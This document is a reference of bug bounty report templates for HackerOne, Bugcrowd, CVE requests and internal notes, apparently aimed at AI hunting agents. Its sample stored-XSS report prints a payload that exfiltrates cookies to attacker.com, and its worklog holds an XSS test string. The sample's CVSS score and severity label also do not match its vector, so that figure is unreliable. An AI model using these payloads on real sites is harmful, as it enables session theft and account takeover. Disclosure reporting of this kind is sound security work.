# Bug Bounty Report Templates Reference

> **Document Version**: 2025.1 | **Purpose**: Professional report templates for AI hunting agents
>
> Templates for HackerOne, Bugcrowd, CVE requests, and internal documentation.

---

## Table of Contents

1. [HackerOne Report Template](#1-hackerone-report-template)
2. [Bugcrowd Submission Template](#2-bugcrowd-submission-template)
3. [CVE Request Template](#3-cve-request-template)
4. [Internal Documentation Template](#4-internal-documentation-template)

---

## 1. HackerOne Report Template

### 1.1 Title Format

```
[Bug Class] in [Feature/Endpoint] leading to [Impact]

Examples:
- "Stored XSS in comment submission leading to session hijacking"
- "IDOR in /api/user/{id} allowing access to any user's data"
- "SQL Injection in search parameter leading to database compromise"
- "SSRF in webhook configuration leading to internal network access"
- "OAuth redirect_uri bypass leading to account takeover"
```

### 1.2 Severity Justification

```markdown
## Severity

**Selected Severity**: [Critical / High / Medium / Low / None]

**CVSS 3.1 Vector**: CVSS:3.1/[AV]:[AC]:[PR]:[UI]:[S]:[C]:[I]:[A]

**CVSS 3.1 Score**: [0.0 - 10.0]

**Justification**:

[Provide 2-3 sentences justifying the severity selection based on:
- Attack complexity (how easy to exploit)
- Required privileges (authenticated vs unauthenticated)
- User interaction required (none, required)
- Scope impact (changed or unchanged)
- Confidentiality impact (none, low, high)
- Integrity impact (none, low, high)
- Availability impact (none, low, high)]

Example:
"This vulnerability is rated High because:
- It requires low privileges (any authenticated user)
- No user interaction is required
- It allows reading sensitive data of other users (C:H)
- It allows modifying other users' data (I:H)
- The attack vector is network-based with low complexity"
```

### 1.3 Summary Structure

```markdown
## Summary

[2-3 sentence executive summary. Include:]
[1. What the vulnerability is]
[2. Where it exists (endpoint/feature)]
[3. What the maximum impact is]

Example:
"The user profile update endpoint at /api/v2/users/{id} fails to
validate that the authenticated user owns the provided user_id. This
allows any authenticated user to read and modify any other user's
profile data, including email addresses. This can be chained with
the password reset functionality to achieve full account takeover."
```

### 1.4 Step-by-Step Reproduction

```markdown
## Steps to Reproduce

### Prerequisites
- [Account type required, e.g., "Standard user account"]
- [Tools required, e.g., "Burp Suite or curl"]
- [Environment details if relevant]

### Step 1: [Action]
[Detailed description of the first step]

### Step 2: [Action]
[Detailed description of the second step]

### Step 3: [Action]
[Detailed description of the third step]

### Step 4: [Action]
[Detailed description of the fourth step]

### Expected Result
[What should happen (secure behavior)]

### Actual Result
[What actually happens (vulnerable behavior)]

---

Example:

### Step 1: Log in to the application
Log in with a standard user account (Account A).
Credentials: user-a@example.com / TestPass123!

### Step 2: Navigate to the profile page
Go to https://target.com/profile/settings

### Step 3: Intercept the profile update request
Using a proxy (Burp Suite), intercept the request when clicking "Save".

### Step 4: Modify the user_id parameter
Change the user_id parameter in the request body from your own ID
to another user's ID (Account B, ID: 45678).

### Expected Result
The server should return 403 Forbidden because the authenticated
user does not own user_id 45678.

### Actual Result
The server returns 200 OK and successfully updates the profile
for user_id 45678, including changing the email address.
```

### 1.5 Impact Statement

```markdown
## Impact

### Security Impact
[Describe the direct security consequences]
- [Data breach / unauthorized access / privilege escalation / etc.]
- [How many users could be affected]
- [Type of data at risk]

### Business Impact
[Describe the business consequences]
- [Financial impact if exploited]
- [Reputational damage]
- [Compliance implications (GDPR, HIPAA, etc.)]

### Attack Scenario
[Describe a realistic attack scenario]
1. [Attacker action]
2. [Victim impact]
3. [Result]

### Affected Users
[Who is affected by this vulnerability]
- [All users / Premium users / Admin users / etc.]
- [Estimated number if known]

### Exploitability
- **Difficulty**: [Low / Medium / High]
- **Privileges Required**: [None / Low (user) / High (admin)]
- **User Interaction**: [None / Required]
- **Attack Vector**: [Network / Adjacent / Local]
```

### 1.6 Proof of Concept

```markdown
## Proof of Concept

### HTTP Request
```
[METHOD] [ENDPOINT] HTTP/1.1
Host: [target.com]
[All relevant headers]
[Request body if applicable]
```

### HTTP Response
```
HTTP/1.1 [STATUS_CODE] [STATUS_TEXT]
[All relevant response headers]
[Response body showing vulnerability]
```

### Screenshots
[Attach numbered screenshots]
1. [Screenshot 1: Description of what it shows]
2. [Screenshot 2: Description of what it shows]
3. [Screenshot 3: Description of what it shows]

### Video
[If required by program, attach video link]
- URL: [Link to video]
- Duration: [Length in seconds]
- Description: [What the video demonstrates]
```

### 1.7 Suggested Fix

```markdown
## Suggested Fix

### Root Cause
[Explain why the vulnerability exists]

### Recommended Fix
[Provide specific, actionable remediation advice]

### Code Example (Secure)
```[language]
[Show secure code implementation if applicable]
```

### Additional Recommendations
- [Additional security measures]
- [Defense in depth suggestions]
- [Testing recommendations]

---

Example:

### Root Cause
The application uses the user_id parameter from the client request
directly in the database query without verifying that the
authenticated user owns the specified user_id.

### Recommended Fix
Implement server-side authorization checks before processing the
profile update. The application should:

1. Extract the user_id from the authenticated session/token
2. Use session-stored user_id for database queries
3. Ignore any user_id provided by the client
4. Return 403 Forbidden if client provides mismatched user_id

### Code Example (Secure)
```python
@app.route('/api/users/<user_id>', methods=['PUT'])
@login_required
def update_profile(user_id):
    # Get user_id from session, NOT from URL parameter
    session_user_id = current_user.id

    # Optional: log attempt to modify other user's profile
    if user_id != session_user_id:
        log_security_event(f"User {session_user_id} attempted to modify user {user_id}")
        return jsonify({"error": "Forbidden"}), 403

    # Proceed with update using session user_id
    user = User.query.get(session_user_id)
    # ... update logic
```

### Additional Recommendations
- Implement audit logging for all profile modifications
- Add rate limiting on profile update endpoints
- Consider implementing resource-level authorization (e.g., Casbin, Oso)
```

### 1.8 Complete HackerOne Report Example

```markdown
# Stored XSS in Comment System Leading to Account Takeover

## Summary
The comment submission system at /api/v1/comments does not properly
sanitize user input before rendering it in HTML. An attacker can
submit a malicious comment containing JavaScript that executes in
the browser of any user who views the comment, allowing session
cookie theft and full account takeover.

## Severity: High

**CVSS 3.1 Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N

**CVSS 3.1 Score**: 9.1

**Justification**: This vulnerability requires low privileges (any
registered user), no user interaction for stored XSS (victim just
needs to view the page), and can lead to complete account takeover
through session hijacking. The scope is changed because the XSS
executes in the context of the target domain.

## Steps to Reproduce

### Prerequisites
- A registered user account on the platform

### Step 1: Log in to the application
Log in with a standard user account.

### Step 2: Navigate to any post or article
Visit https://target.com/blog/post-123

### Step 3: Submit a comment with XSS payload
In the comment form, enter the following payload:
```
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

### Step 4: View the comment
After submission, the comment is displayed on the page. The
JavaScript payload executes in the browser.

### Step 5: Verify cookie exfiltration
Check the attacker server logs for the exfiltrated cookie.

### Expected Result
The comment should be sanitized, and the payload should not execute.
The <img> tag should be escaped or removed.

### Actual Result
The payload executes, and the victim's session cookie is sent to
the attacker's server.

## Impact

### Security Impact
- Complete account takeover for any user viewing the comment
- Ability to perform actions on behalf of the victim
- Potential access to sensitive account data

### Business Impact
- Loss of user trust
- Potential data breach notifications
- Regulatory compliance implications

### Affected Users
All users of the platform who view the affected page.

### Attack Scenario
1. Attacker posts a malicious comment on a popular post
2. Victims (other users) view the post and their cookies are stolen
3. Attacker uses stolen cookies to impersonate victims
4. Attacker can perform any action the victim could perform

## Proof of Concept

### HTTP Request
```
POST /api/v1/comments HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "post_id": 123,
  "content": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">"
}
```

### HTTP Response
```
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": 456,
  "post_id": 123,
  "author": "attacker_user",
  "content": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">",
  "created_at": "2024-01-15T10:30:00Z"
}
```

### Screenshot Evidence
1. Screenshot showing the malicious comment being submitted
2. Screenshot showing the comment rendered on the page
3. Screenshot showing the network request exfiltrating the cookie
4. Screenshot showing the attacker server receiving the cookie

## Suggested Fix

### Root Cause
User-provided HTML content is rendered directly without proper
sanitization or escaping.

### Recommended Fix
1. Use a proven HTML sanitization library (e.g., DOMPurify for
   client-side, Bleach for Python, jsoup for Java)
2. Implement Content Security Policy (CSP) to prevent inline
   script execution
3. Escape all user input when rendering in HTML context
4. Consider using a markdown parser with strict allowlisting

### Code Example
```python
import bleach

ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'a']
ALLOWED_ATTRS = {'a': ['href', 'title']}

def sanitize_comment(content):
    return bleach.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True
    )
```

## References
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- OWASP Top 10 2021: A03:2021 - Injection
- OWASP XSS Prevention Cheat Sheet
```

---

## 2. Bugcrowd Submission Template

### 2.1 Key Differences from HackerOne

| Aspect | HackerOne | Bugcrowd |
|--------|-----------|----------|
| **Title** | Custom format | Custom format |
| **Priority** | Severity + CVSS | Priority (P1-P5) |
| **Template** | Markdown | Structured fields |
| **Attachments** | Inline + files | Files primarily |
| **Retesting** | Built-in | Requested by client |
| **Currency** | USD (default) | USD (default) |
| **Duplicates** | Marked by triage | Marked by triage |

### 2.2 Bugcrowd Priority Calculation

| Priority | CVSS Range | Description |
|----------|-----------|-------------|
| **P1** | 9.0-10.0 | Critical - Immediate action required |
| **P2** | 7.0-8.9 | High - Fix within 30 days |
| **P3** | 4.0-6.9 | Medium - Fix within 90 days |
| **P4** | 1.0-3.9 | Low - Fix within 180 days |
| **P5** | 0.0 | Informational - No fix required |

### 2.3 Bugcrowd Submission Template

```markdown
# Bugcrowd Submission

## Title
[Bug Class] in [Feature/Endpoint] - [Brief Impact]

Example: "SQL Injection in Search Parameter - Database Access"

## Priority
P[1-5]

## URL/Endpoint
https://target.com/vulnerable-endpoint

## Description
[2-3 sentence description of the vulnerability and its impact]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]
4. [Step 4]

## Additional Information
[Any additional context, screenshots, or logs]

## Impact
[Description of the security and business impact]

## Suggested Fix
[Recommended remediation approach]

## Attachments
- [Screenshot/Video file names]
- [Burp/ZAP session files if applicable]
- [Custom scripts or tools used]
```

### 2.4 Bugcrowd Attachment Requirements

| Attachment Type | When Required | Format |
|----------------|--------------|--------|
| Screenshot | Always | PNG, JPG |
| Video | P1-P3 findings | MP4, under 2 minutes |
| HTTP Request/Response | API vulnerabilities | Text or HAR |
| Burp/ZAP Session | Complex findings | .burp or .zap |
| Proof Script | RCE, SQLi | Python/Bash script |
| Proof File | File upload vulns | Safe test file |

---

## 3. CVE Request Template

### 3.1 CNA Coordination Requirements

```markdown
# CVE Request

## When to Request a CVE
- [ ] The vulnerability is confirmed and fixed
- [ ] The vendor acknowledges the vulnerability
- [ ] A CVE ID is not already assigned
- [ ] The vulnerability meets CVE inclusion criteria

## CVE Inclusion Criteria
1. The vulnerability must be independently fixable
2. The vulnerability must be in code (not configuration)
3. The vulnerability must affect a specific product/version
4. The vulnerability must have a security impact

## CNA (CVE Numbering Authority) Options
1. **Vendor CNA** - If the vendor is a CNA, request through them
2. **Bug Bounty Platform CNA** - HackerOne is a CNA
3. **MITRE CNA** - Submit directly to MITRE
4. **Distributed Weakness Filing (DWF)** - For open source projects
```

### 3.2 CVE Request Form

```markdown
# CVE Request Submission

## Contact Information
- **Name**: [Your name or pseudonym]
- **Organization**: [If applicable]
- **Email**: [Contact email]

## Affected Product
- **Product Name**: [Name of the product/software]
- **Vendor**: [Vendor name]
- **Version(s)**: [Affected versions]
- **CPE**: [Common Platform Enumeration if known]

## Vulnerability Description
[Technical description of the vulnerability]

## Vulnerability Type
- CWE ID: [e.g., CWE-79 for XSS]
- CWE Name: [e.g., Cross-site Scripting]

## Attack Vector
- **Network**: [Yes/No]
- **Local**: [Yes/No]
- **Adjacent Network**: [Yes/No]
- **Physical**: [Yes/No]

## Impact
- **Confidentiality**: [None/Low/High]
- **Integrity**: [None/Low/High]
- **Availability**: [None/Low/High]

## Discoverer
- **Name**: [Your name or pseudonym]
- **Date Discovered**: [YYYY-MM-DD]
- **Reference**: [Bug bounty report URL or advisory link]

## References
1. [Vendor advisory URL]
2. [Bug bounty report URL]
3. [GitHub commit fixing the issue]
4. [Any other relevant references]

## Description for CVE Entry
[Write a 1-2 paragraph technical description suitable for
public CVE database. Be specific but not overly verbose.]

Example:
"A cross-site scripting (XSS) vulnerability in ExampleCMS
versions 1.2.3 through 1.2.5 allows remote attackers to
execute arbitrary JavaScript in the context of the user's
browser via a crafted comment submission. The vulnerability
exists because the comment system does not properly sanitize
user input before rendering it in HTML."
```

### 3.3 CVE Description Standards

```markdown
## Description Format Guidelines

### Required Elements
1. **Vulnerability type** (XSS, SQLi, buffer overflow, etc.)
2. **Affected product and versions**
3. **Attack requirements** (authenticated, unauthenticated, etc.)
4. **Impact** (what the attacker can achieve)

### Description Template
"[VULN_TYPE] in [PRODUCT] [VERSIONS] allows [ATTACKER_TYPE] to
[IMPACT] via [ATTACK_VECTOR]."

### Examples

XSS:
"Cross-site scripting (XSS) in ExampleCMS 1.2.3 allows remote
authenticated users to inject arbitrary web script or HTML via
the comment parameter."

SQL Injection:
"SQL injection vulnerability in ExampleApp 2.0.1 allows remote
attackers to execute arbitrary SQL commands via the id parameter
in the /api/search endpoint."

IDOR:
"Insecure direct object reference (IDOR) in ExampleAPI 3.0 allows
remote authenticated users to access other users' data by
modifying the user_id parameter."

SSRF:
"Server-side request forgery (SSRF) in ExampleService 1.5.0
allows remote authenticated users to make requests to internal
network resources via the url parameter."
```

### 3.4 Reference Formatting

```markdown
## CVE Reference Format

### Advisory References
- Vendor advisory: https://vendor.com/security/advisory/2024-001
- Security bulletin: https://vendor.com/security/bulletin/SB-2024-01

### Bug Bounty References
- HackerOne report: https://hackerone.com/reports/123456
- Bugcrowd submission: [Include submission ID]

### Code References
- Fix commit: https://github.com/vendor/product/commit/abc123
- Patch: https://github.com/vendor/product/pull/456
- Diff: https://github.com/vendor/product/compare/v1.2.3...v1.2.4

### External References
- Exploit DB: https://www.exploit-db.com/exploits/12345
- Security advisory: https://security-advisory.example/2024/001

### Reference Format for CVE Entry
["https://vendor.com/security/advisory/2024-001",
 "https://hackerone.com/reports/123456",
 "https://github.com/vendor/product/commit/abc123"]
```

---

## 4. Internal Documentation Template

### 4.1 Obsidian Vault Format

```markdown
# Obsidian Vault Structure for Bug Bounty Documentation

## Directory Structure
```
vault/
├── 00-inbox/              # Raw findings before triage
├── 01-programs/           # Program-specific notes
│   ├── program-name/
│   │   ├── scope.md
│   │   ├── tech-stack.md
│   │   ├── endpoints.md
│   │   ├── auth-flow.md
│   │   └── findings/
│   │       ├── finding-001.md
│   │       └── finding-002.md
├── 02-recon/              # Reconnaissance results
│   ├── subdomains/
│   ├── endpoints/
│   ├── technologies/
│   └── screenshots/
├── 03-findings/           # Validated findings
│   ├── critical/
│   ├── high/
│   ├── medium/
│   ├── low/
│   └── informational/
├── 04-reports/            # Submitted reports
│   ├── draft/
│   └── submitted/
├── 05-tools/              # Custom tools and scripts
├── 06-wordlists/          # Custom wordlists
├── templates/             # Note templates
└── daily/                 # Daily work logs
```

## Note Templates

### Program Note Template
```markdown
---
program: "Program Name"
platform: "HackerOne/Bugcrowd/Intigriti"
status: "active/paused/completed"
start_date: YYYY-MM-DD
end_date: YYYY-MM-DD
rewards: 0
tags: [web, api, mobile]
---

# Program Name

## Scope
- [ ] In-scope domains
- [ ] Out-of-scope domains
- [ ] In-scope vulnerability types
- [ ] Out-of-scope vulnerability types

## Technology Stack
- [ ] Frontend frameworks
- [ ] Backend frameworks
- [ ] Databases
- [ ] Cloud providers
- [ ] Third-party services

## Authentication
- [ ] Login methods
- [ ] MFA requirements
- [ ] Session management
- [ ] API authentication

## Endpoints
- [ ] API documentation
- [ ] Key endpoints
- [ ] Parameter map

## Findings
- [ ] Finding 1
- [ ] Finding 2

## Notes
[Miscellaneous observations and notes]
```

### Finding Note Template
```markdown
---
program: "Program Name"
title: "Brief Finding Title"
type: "XSS/SQLi/IDOR/SSRF/etc"
severity: "Critical/High/Medium/Low"
status: "identified/validated/reported/accepted/rejected"
cvss: "CVSS:3.1/..."
score: 0.0
date_found: YYYY-MM-DD
date_reported: YYYY-MM-DD
tags: [xss, stored, authenticated]
---

# Finding: [Title]

## Summary
[Brief description of the vulnerability]

## Affected Endpoint
- **URL**: https://target.com/endpoint
- **Method**: POST
- **Parameters**: [List parameters]

## Vulnerability Details
[Detailed technical description]

## Proof of Concept
```
[HTTP request]
```

```
[HTTP response]
```

## Impact
[Description of the impact]

## Exploitation Steps
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Screenshots
![Screenshot 1](path/to/screenshot.png)

## Suggested Fix
[Recommended remediation]

## Timeline
- **Discovered**: YYYY-MM-DD
- **Validated**: YYYY-MM-DD
- **Reported**: YYYY-MM-DD
- **Triaged**: YYYY-MM-DD
- **Resolved**: YYYY-MM-DD

## Related
- [[Related Finding 1]]
- [[Program Note]]
```
```

### 4.2 JSONL Worklog Schema

```json
{"type": "metadata", "timestamp": "2024-01-15T09:00:00Z", "program": "Example Program", "platform": "HackerOne"}
{"type": "recon", "timestamp": "2024-01-15T09:05:00Z", "action": "subdomain_enumeration", "tool": "subfinder", "output": "found 150 subdomains", "details": {"count": 150, "method": "passive"}}
{"type": "recon", "timestamp": "2024-01-15T09:15:00Z", "action": "technology_fingerprinting", "tool": "wappalyzer", "output": "React, Node.js, Express, PostgreSQL", "details": {"frontend": "React 18.2.0", "backend": "Express 4.18.0", "database": "PostgreSQL 14"}}
{"type": "discovery", "timestamp": "2024-01-15T09:30:00Z", "action": "endpoint_discovery", "tool": "katana", "output": "found 50 API endpoints", "details": {"endpoints": ["/api/v1/users", "/api/v1/posts", "/api/v1/comments"]}}
{"type": "test", "timestamp": "2024-01-15T09:45:00Z", "action": "xss_test", "target": "/api/v1/comments", "method": "POST", "payload": "<img src=x onerror=alert(1)>", "result": "vulnerable", "details": {"context": "html", "stored": true}}
{"type": "finding", "timestamp": "2024-01-15T10:00:00Z", "severity": "high", "title": "Stored XSS in comment system", "endpoint": "/api/v1/comments", "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N", "score": 9.1, "status": "draft"}
{"type": "report", "timestamp": "2024-01-15T10:30:00Z", "action": "report_submitted", "platform": "HackerOne", "report_id": "1234567", "finding_id": "finding-001"}
{"type": "response", "timestamp": "2024-01-16T14:00:00Z", "action": "triaged", "report_id": "1234567", "severity_assigned": "high", "bounty": 1500}
```

**JSONL Schema Definition:**

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "BugBountyWorklog",
  "type": "object",
  "required": ["type", "timestamp"],
  "properties": {
    "type": {
      "type": "string",
      "enum": ["metadata", "recon", "discovery", "test", "finding", "report", "response", "note"]
    },
    "timestamp": {
      "type": "string",
      "format": "date-time"
    },
    "program": {
      "type": "string",
      "description": "Target program name"
    },
    "platform": {
      "type": "string",
      "enum": ["HackerOne", "Bugcrowd", "Intigriti", "Synack", "YesWeHack", "Direct"]
    },
    "action": {
      "type": "string",
      "description": "Action performed"
    },
    "tool": {
      "type": "string",
      "description": "Tool used for the action"
    },
    "target": {
      "type": "string",
      "description": "Target URL or endpoint"
    },
    "method": {
      "type": "string",
      "enum": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
    },
    "payload": {
      "type": "string",
      "description": "Test payload used"
    },
    "result": {
      "type": "string",
      "enum": ["vulnerable", "not_vulnerable", "inconclusive", "error"]
    },
    "severity": {
      "type": "string",
      "enum": ["critical", "high", "medium", "low", "informational"]
    },
    "cvss": {
      "type": "string",
      "description": "CVSS 3.1 vector string"
    },
    "score": {
      "type": "number",
      "minimum": 0,
      "maximum": 10
    },
    "status": {
      "type": "string",
      "enum": ["draft", "submitted", "triaged", "accepted", "rejected", "duplicate", "resolved"]
    },
    "report_id": {
      "type": "string",
      "description": "Platform report ID"
    },
    "bounty": {
      "type": "number",
      "description": "Bounty amount in USD"
    },
    "details": {
      "type": "object",
      "description": "Additional details specific to the entry type"
    }
  }
}
```

### 4.3 Finding Classification Taxonomy

#### Classification Hierarchy

```
Vulnerability
├── Injection
│   ├── Cross-Site Scripting (XSS)
│   │   ├── Reflected XSS
│   │   ├── Stored XSS
│   │   ├── DOM-based XSS
│   │   ├── Blind XSS
│   │   └── Self XSS
│   ├── SQL Injection
│   │   ├── Error-based
│   │   ├── Union-based
│   │   ├── Boolean Blind
│   │   ├── Time-based Blind
│   │   └── Stacked Queries
│   ├── NoSQL Injection
│   ├── Command Injection
│   ├── LDAP Injection
│   ├── XPath Injection
│   ├── XML Injection
│   ├── Template Injection (SSTI)
│   ├── Code Injection
│   ├── Expression Language Injection
│   └── Prototype Pollution
├── Authentication
│   ├── Brute Force
│   ├── Credential Stuffing
│   ├── Session Fixation
│   ├── Session Hijacking
│   ├── Session Prediction
│   ├── Weak Password Policy
│   ├── Missing MFA
│   ├── MFA Bypass
│   ├── JWT Vulnerabilities
│   │   ├── Algorithm Confusion
│   │   ├── Key Confusion
│   │   ├── Weak Signature
│   │   ├── Missing Signature
│   │   └── Expiration Bypass
│   └── OAuth Issues
│       ├── Redirect URI Bypass
│       ├── State Parameter Missing
│       ├── PKCE Bypass
│       └── Token Leakage
├── Authorization
│   ├── IDOR
│   │   ├── Direct Reference
│   │   └── Indirect Reference
│   ├── Path Traversal
│   ├── Privilege Escalation
│   │   ├── Vertical
│   │   └── Horizontal
│   ├── Missing Authorization
│   ├── Mass Assignment
│   ├── Parameter Pollution
│   └── Insecure Direct Object Reference
├── Information Disclosure
│   ├── Sensitive Data Exposure
│   ├── Stack Trace Disclosure
│   ├── Verbose Error Messages
│   ├── Source Code Disclosure
│   ├── Backup File Exposure
│   ├── Directory Listing
│   ├── Log File Exposure
│   ├── Configuration Exposure
│   ├── API Key Exposure
│   └── Metadata Leakage
├── Server-Side
│   ├── Server-Side Request Forgery (SSRF)
│   │   ├── Basic SSRF
│   │   ├── Blind SSRF
│   │   └── Cloud Metadata
│   ├── Server-Side Template Injection (SSTI)
│   ├── Server-Side Includes (SSI)
│   ├── XML External Entity (XXE)
│   └── Insecure Deserialization
├── Client-Side
│   ├── Cross-Site Request Forgery (CSRF)
│   ├── DOM Clobbering
│   ├── Open Redirect
│   ├── Tabnabbing
│   ├── Clickjacking
│   ├── CORS Misconfiguration
│   └── PostMessage Issues
├── Cryptographic
│   ├── Weak Encryption
│   ├── Weak Hashing
│   ├── Insecure Randomness
│   ├── Cleartext Transmission
│   ├── Cleartext Storage
│   └── Padding Oracle
├── Infrastructure
│   ├── Container Escape
│   ├── Kubernetes Misconfiguration
│   ├── Cloud Misconfiguration
│   ├── Subdomain Takeover
│   ├── DNS Misconfiguration
│   └── TLS/SSL Issues
├── File Handling
│   ├── Arbitrary File Upload
│   ├── File Inclusion (LFI/RFI)
│   ├── Zip Slip
│   ├── CSV Injection
│   └── SVG XSS
└── Business Logic
    ├── Race Condition
    ├── Price Manipulation
    ├── Workflow Bypass
    ├── Feature Abuse
    └── Logic Flaw
```

#### Classification Tags

```yaml
# Impact tags
impact-critical: "Full system compromise, RCE, full data breach"
impact-high: "Account takeover, sensitive data access, significant business impact"
impact-medium: "Limited data access, partial feature abuse, moderate business impact"
impact-low: "Information disclosure, minor feature abuse, limited business impact"
impact-info: "Informational, best practice, no direct security impact"

# Exploitability tags
exploitability-easy: "No authentication required, no user interaction, automated exploitation possible"
exploitability-moderate: "Authentication required, some user interaction, or specific conditions"
exploitability-difficult: "Admin access required, significant user interaction, or complex conditions"
exploitability-theoretical: "Theoretical vulnerability, no practical exploitation demonstrated"

# Attack vector tags
vector-network: "Exploitable over the network"
vector-adjacent: "Exploitable from adjacent network"
vector-local: "Requires local access"
vector-physical: "Requires physical access"

# Authentication tags
auth-none: "No authentication required"
auth-low: "Standard user authentication required"
auth-high: "Admin/privileged authentication required"

# Scope tags
scope-unchanged: "Impact limited to vulnerable component"
scope-changed: "Impact extends beyond vulnerable component"

# Testing method tags
method-manual: "Discovered through manual testing"
method-automated: "Discovered through automated scanning"
method-hybrid: "Discovered through combined manual and automated testing"
```

### 4.4 Daily Work Log Template

```markdown
## Daily Work Log Template

### Date: YYYY-MM-DD

#### Programs Active
- [ ] Program A
- [ ] Program B

#### Time Allocation
| Activity | Time | Description |
|----------|------|-------------|
| Reconnaissance | 2h | Subdomain enumeration for Program A |
| Testing | 3h | XSS testing on comment system |
| Report Writing | 1h | Drafted report for XSS finding |
| Research | 1h | Read about new SSRF techniques |

#### Findings
| ID | Program | Type | Severity | Status |
|----|---------|------|----------|--------|
| F001 | Program A | Stored XSS | High | Draft |

#### Endpoints Tested
- [x] /api/v1/comments - Stored XSS (FOUND)
- [x] /api/v1/users - No findings
- [x] /api/v1/search - No findings

#### Tools Used
- subfinder
- katana
- nuclei
- Burp Suite

#### Notes
[Observations, ideas, blocked items]

#### Tomorrow's Plan
- [ ] Continue testing Program A
- [ ] Submit XSS report
- [ ] Start testing Program B
```

### 4.5 Report Quality Checklist

```markdown
## Pre-Submission Quality Checklist

### Content Quality
- [ ] Title is clear and specific
- [ ] Summary is concise and accurate
- [ ] Steps to reproduce are unambiguous
- [ ] Expected vs actual results are stated
- [ ] Impact is clearly described
- [ ] CVSS score is accurate and justified
- [ ] Suggested fix is specific and actionable

### Technical Accuracy
- [ ] Vulnerability is confirmed (not theoretical)
- [ ] Proof of concept is reproducible
- [ ] HTTP requests/response are accurate
- [ ] Screenshots show the vulnerability
- [ ] No false positives in the report
- [ ] Impact claims are demonstrated, not assumed

### Professional Standards
- [ ] No spelling or grammar errors
- [ ] Formatting is clean and consistent
- [ ] All links are working
- [ ] Attachments are properly named
- [ ] No sensitive data in screenshots
- [ ] Video is under 2 minutes (if included)

### Program Compliance
- [ ] Report is in-scope
- [ ] Vulnerability class is eligible
- [ ] Program-specific requirements are met
- [ ] Language matches program requirements
- [ ] Template follows program guidelines

### Impact Maximization
- [ ] Maximum demonstrated impact (not just detection)
- [ ] Clear attack scenario described
- [ ] Business impact quantified if possible
- [ ] Chaining potential identified
- [ ] No overclaiming of impact
```

---

## Appendix: Quick Reference

### Report Metadata Template

```markdown
---
report_id: "PENDING"
program: "[Program Name]"
platform: "[HackerOne/Bugcrowd]"
title: "[Bug Class] in [Endpoint] leading to [Impact]"
type: "[XSS/SQLi/IDOR/etc]"
severity: "[Critical/High/Medium/Low]"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
cvss_score: 8.1
status: "draft"
date_discovered: "YYYY-MM-DD"
date_submitted: "YYYY-MM-DD"
date_triaged: ""
date_resolved: ""
bounty: 0
tags: [web, xss, stored, authenticated]
---
```

### CVSS Quick Calculator

```
Step 1: Attack Vector (AV)
  N (Network) = 0.85  |  A (Adjacent) = 0.62
  L (Local) = 0.55    |  P (Physical) = 0.2

Step 2: Attack Complexity (AC)
  L (Low) = 0.77      |  H (High) = 0.44

Step 3: Privileges Required (PR)
  N (None) = 0.85     |  L (Low) = 0.62  |  H (High) = 0.27
  (If Scope Changed: N=0.85, L=0.68, H=0.5)

Step 4: User Interaction (UI)
  N (None) = 0.85     |  R (Required) = 0.62

Step 5: Scope (S)
  U (Unchanged)       |  C (Changed)

Step 6: Impact Metrics (C, I, A)
  H (High) = 0.56     |  L (Low) = 0.22  |  N (None) = 0

Base Score = f(Scope, Impact, Exploitability)

Quick Reference:
- RCE/Full Compromise: 9.8-10.0 (Critical)
- Account Takeover: 8.1-9.1 (High-Critical)
- Data Breach: 6.5-8.1 (Medium-High)
- Information Disclosure: 2.3-6.5 (Low-Medium)
```

---

*End of Bug Bounty Report Templates Reference*
